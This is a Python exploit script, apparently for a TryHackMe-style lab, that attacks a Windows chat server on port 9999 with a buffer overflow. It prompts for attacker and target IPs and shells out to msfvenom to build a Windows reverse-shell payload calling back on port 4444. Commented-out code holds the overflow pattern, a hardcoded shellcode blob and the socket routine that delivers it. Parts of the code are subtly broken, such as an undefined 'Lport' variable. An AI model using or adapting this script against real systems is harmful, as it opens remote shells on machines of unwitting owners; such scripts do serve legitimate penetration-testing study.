import netifaces as ni
import socket
import sys
import ipaddress
import re
import time
import subprocess
import fcntl
import struct
import os

os.system('cls' if os.name == 'nt' else 'clear')

# This is the address of the machine and service I want to attack
LPORT="4444"
Port_Number = "9999"   #Port number chatserver.exe runs on. 
username = b"Nothing"

#This information is based on the machines service module
#message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 10
#payload = (b"\xda\xc8\xba\x85\xe5\xda\xc2\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x52\x83\xc7\x04\x31\x57\x13\x03\xd2\xf6\x38\x37\x20\x10\x3e\xb8\xd8\xe1\x5f\x30\x3d\xd0\x5f\x26\x36\x43\x50\x2c\x1a\x68\x1b\x60\x8e\xfb\x69\xad\xa1\x4c\xc7\x8b\x8c\x4d\x74\xef\x8f\xcd\x87\x3c\x6f\xef\x47\x31\x6e\x28\xb5\xb8\x22\xe1\xb1\x6f\xd2\x86\x8c\xb3\x59\xd4\x01\xb4\xbe\xad\x20\x95\x11\xa5\x7a\x35\x90\x6a\xf7\x7c\x8a\x6f\x32\x36\x21\x5b\xc8\xc9\xe3\x95\x31\x65\xca\x19\xc0\x77\x0b\x9d\x3b\x02\x65\xdd\xc6\x15\xb2\x9f\x1c\x93\x20\x07\xd6\x03\x8c\xb9\x3b\xd5\x47\xb5\xf0\x91\x0f\xda\x07\x75\x24\xe6\x8c\x78\xea\x6e\xd6\x5e\x2e\x2a\x8c\xff\x77\x96\x63\xff\x67\x79\xdb\xa5\xec\x94\x08\xd4\xaf\xf0\xfd\xd5\x4f\x01\x6a\x6d\x3c\x33\x35\xc5\xaa\x7f\xbe\xc3\x2d\x7f\x95\xb4\xa1\x7e\x16\xc5\xe8\x44\x42\x95\x82\x6d\xeb\x7e\x52\x91\x3e\xd0\x02\x3d\x91\x91\xf2\xfd\x41\x7a\x18\xf2\xbe\x9a\x23\xd8\xd6\x31\xde\x8b\xd2\xc8\xe4\xa5\x8b\xd0\xe4\x28\x10\x5c\x02\x20\xb8\x08\x9d\xdd\x21\x11\x55\x7f\xad\x8f\x10\xbf\x25\x3c\xe5\x0e\xce\x49\xf5\xe7\x3e\x04\xa7\xae\x41\xb2\xcf\x2d\xd3\x59\x0f\x3b\xc8\xf5\x58\x6c\x3e\x0c\x0c\x80\x19\xa6\x32\x59\xff\x81\xf6\x86\x3c\x0f\xf7\x4b\x78\x2b\xe7\x95\x81\x77\x53\x4a\xd4\x21\x0d\x2c\x8e\x83\xe7\xe6\x7d\x4a\x6f\x7e\x4e\x4d\xe9\x7f\x9b\x3b\x15\x31\x72\x7a\x2a\xfe\x12\x8a\x53\xe2\x82\x75\x8e\xa6\xb3\x3f\x92\x8f\x5b\xe6\x47\x92\x01\x19\xb2\xd1\x3f\x9a\x36\xaa\xbb\x82\x33\xaf\x80\x04\xa8\xdd\x99\xe0\xce\x72\x99\x20")

ans = True
while ans:
    print("""
What network is the machine you are exploiting on?\n
[1] Local Network Loopback: "lo"
[2] Ethernet Interface 0:   "eth0"
[3] Try Hack Me Network:    "tun0"
[4] Custom:                 "User Specified IP"
""")
    ans = input("Please enter your option: ")
    if ans == "1":
        ni.ifaddresses('lo')
        LHOST = ni.ifaddresses('lo')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "2":
        ni.ifaddresses('eth0')
        LHOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "3":
        ni.ifaddresses('tun0')
        LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "4":
        while True:
            try:
                LHOST = ipaddress.ip_address(
                    input('\nPlease Enter the Custom IP address of your local mahine on the network: '))
                break
            except ValueError:
                print('\nYou entered an invalid IP Adress, please try again... ')
                time.sleep(2)
        
        print("\nLocal IP Address set as: ", LHOST)
        break
    elif ans != "":
        print("\n****Not Valid Choice, Try again****")
        time.sleep(2)
        print("\nWhat would you like to do?")
        os.system('cls' if os.name == 'nt' else 'clear') 

while True:
    try:
        RHOST = ipaddress.ip_address(input('\nPlease Enter the IP address of the machine you wish to attack: '))
        break
    except ValueError:
        print('You entered an invalid IP Adress, please try again... ')
        time.sleep(2)
        continue

print("\nRemote machine IP Address set as: ", RHOST)

print("\nGenerating Exploit code for injection, Please Standby...\n")

# Wait for 2 seconds
time.sleep(2)

cmd = ("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b \\x00 -f c " .format(LHOST, Lport) + "| tr -d '\n' | sed 's/\"//g' | sed 's/.\{22\}//' | sed 's/.$//' | sed 's/^/\"/;s/$/\"/' ")
#print (cmd)
SHELL = subprocess.check_output(cmd,shell=True)

print("\n\nInjection payload created...\n\n", SHELL)


#cmd = 'msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b \\x00 -f c' .format(LHOST, Port_Number)
#retcode = subprocess.call(cmd,shell=True)

#cmd = "msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9999 -b \\x00 -f c | tr -d '\n' >test.txt ; sed -i 's/\"//g' test.txt ; sed -i 's/.\{22\}//' test.txt ; sed -i 's/.$//' test.txt"
#retcode = subprocess.call(cmd,shell=True)

#try:
#    print("Trying initial coonnection with ",IP_Address)
#    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#    s.connect(({}, {})) .format(RHOST, Port_Number)
#    print("CONNECTION SUCCESS!, Sending payload and breaking the program...")
#    s.recv(1024)
#    s.recv(1024)
#    s.send(username + b'\r\n')
#    print("Username sent successfully")
#    s.send(message + payload + b'\r\n')
#    print("Message sent successfully")
#    s.recv(1024)
#    s.close()

#except:
#    print("The server is not available to connect to")
#    sys.exit()
